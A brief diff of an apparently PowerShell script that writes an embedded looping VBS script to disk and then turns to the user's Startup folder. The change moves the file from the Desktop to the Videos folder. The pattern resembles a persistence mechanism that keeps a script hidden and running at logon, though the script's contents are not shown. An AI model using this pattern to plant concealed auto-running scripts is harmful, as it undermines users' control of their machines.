@@ -60,7 +60,7 @@ Do
 Loop
 "@
 
-$vbsFilePath = [System.IO.Path]::Combine($desktopPath, "script.vbs")
+$vbsFilePath = [System.IO.Path]::Combine($videosPath, "script.vbs")
 $vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
 
 # Get the user's Startup folder
